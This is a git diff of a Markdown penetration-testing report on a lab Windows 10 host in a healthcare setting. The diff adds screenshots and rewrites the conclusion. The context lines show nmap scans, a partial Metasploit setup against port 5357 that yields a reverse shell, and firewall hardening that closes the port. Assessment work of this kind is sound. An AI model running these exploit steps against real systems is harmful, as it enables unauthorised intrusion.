@@ -12,15 +12,19 @@ The core of this engagement revolved around discovering the presence of UPnP/SSD
 
 This report also focuses on enforcing system hardening measures by applying firewall rules and disabling insecure ports and services—thus closing the attack surface.
 
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/2ec860ca-6629-44ba-9595-f429dfe34e54" alt="VAPT_Cover">
+</p>
+
 ---
 
 # Vulnerability Assessment and Penetration Testing (VAPT) Report
 
 ## Target: Windows 10 Host – Healthcare Environment
 
-**Prepared by:** Aditya Bhatt
-**Designation:** VAPT Analyst | Cybersecurity Professional
-**Contact:** [info.adityabhatt3010@gmail.com](mailto:info.adityabhatt3010@gmail.com) | +91-9818993884
+**Prepared by:** Aditya Bhatt <br/>
+**Designation:** VAPT Analyst | Cybersecurity Professional <br/>
+**Contact:** [info.adityabhatt3010@gmail.com](mailto:info.adityabhatt3010@gmail.com) | +91-9818993884 <br/>
 
 ---
 
@@ -66,6 +70,8 @@ Before technical assessment, HIPAA compliance standards were analyzed:
    ipconfig
    ```
 
+   ![1](https://github.com/user-attachments/assets/71d85add-adde-4f48-a844-6e983b5e7092) <br/>
+
    Output: IP Address of Windows host – `192.168.178.142`
 
 2. **Live Host Discovery**
@@ -73,6 +79,10 @@ Before technical assessment, HIPAA compliance standards were analyzed:
    ```bash
    nmap -sn 192.168.178.1/24
    ```
+
+   ![2](https://github.com/user-attachments/assets/f422773b-12b9-4544-a1ce-0e2f8a527b27) <br/>
+   ![3](https://github.com/user-attachments/assets/a8b95fcd-60a4-4465-a3d7-d12895d14094) <br/>
+   ![4](https://github.com/user-attachments/assets/073e32cf-ad14-4b51-9f14-c8933249837c) <br/>
 
    Identified active host: `192.168.178.142`
 
@@ -82,6 +92,9 @@ Before technical assessment, HIPAA compliance standards were analyzed:
    nmap -sS 192.168.178.142
    nmap -sV -p5357 192.168.178.142
    ```
+
+   ![5](https://github.com/user-attachments/assets/2616873b-82b0-43a9-9986-aa62bd48c40b) <br/>
+   ![6](https://github.com/user-attachments/assets/b773eceb-db4a-4188-a8a6-da54731bade0) <br/>
 
    Detected: HTTPAPI httpd 2.0 on TCP port 5357
 
@@ -104,12 +117,16 @@ set RPORT 5357
 set LHOST 192.168.178.137
 exploit
 ```
+   
+![7](https://github.com/user-attachments/assets/4388613c-0fc0-4edc-82d5-13dad263e4b6) <br/>
 
 Post-exploit command:
 
 ```bash
 sysinfo
 ```
+
+![8](https://github.com/user-attachments/assets/92b85a87-a109-4b62-90c8-b25fc01bcfcc) <br/>
 
 Outcome: Successfully obtained system details, confirming access via reverse shell.
 
@@ -120,8 +137,19 @@ Outcome: Successfully obtained system details, confirming access via reverse she
 **Steps:**
 
 * Navigate to Windows Firewall → Advanced Settings
+
+  
+![9](https://github.com/user-attachments/assets/b7423a21-9630-412c-95ef-1e6625544581) <br/>
+![10](https://github.com/user-attachments/assets/dd6a39e8-fc0b-41fc-bd01-e1a1e19bcfaf) <br/>
+![11](https://github.com/user-attachments/assets/10e4c256-83c6-4059-a6f4-2ba2f860cb0a) <br/>
+
 * Create custom inbound/outbound rules to block port `5357`
+
+![12](https://github.com/user-attachments/assets/9d1a2025-00a3-4148-b38b-8fb2906accf8) <br/>
+
 * Disable UPnP-related services, if active
+
+![13](https://github.com/user-attachments/assets/60c973fb-74ba-4ed3-8260-5a6d4aeaf3dd) <br/>
 
 ---
 
@@ -132,6 +160,8 @@ Re-run port scan:
 ```bash
 nmap -sV -p5357 192.168.178.142
 ```
+
+![14](https://github.com/user-attachments/assets/3afa6e52-9724-43c5-9f5f-b9c4c63bbfda) <br/>
 
 Status: Port is now closed/filtered. No response from HTTPAPI service.
 
@@ -195,12 +225,12 @@ This case highlights the critical need for continuous vulnerability monitoring, 
 
 ## **🛡️ Final Thoughts**
 
-In cybersecurity, what’s running silently in the background often presents the loudest threat. The convenience of auto-discovery protocols like UPnP comes with serious risks if left unchecked. This exercise proves how easily attackers can exploit legacy endpoints if visibility, patching, and access controls are neglected.
+This VAPT engagement served as a clear demonstration of how overlooked services like HTTPAPI and protocols such as UPnP can open serious attack surfaces within enterprise environments—especially in healthcare, where system uptime often takes precedence over security hygiene.
 
-Harden first. Monitor always. Trust nothing by default.
+While the exploitation required minimal effort, mitigation demanded structured firewall policies, service-level auditing, and an understanding of risk beyond what’s visible. In the end, proactive hardening proved to be the most effective defense.
 
-Thanks for reading. Stay sharp, stay secured.
+**Security isn't just about fixing vulnerabilities—it’s about building systems that expect to be targeted and are ready to withstand it.**
 
-**#cybersecurity #vapt #upnp #networksecurity #healthcareinfosec**
+Thank you for reading. Stay informed. Stay secure.
 
 ---
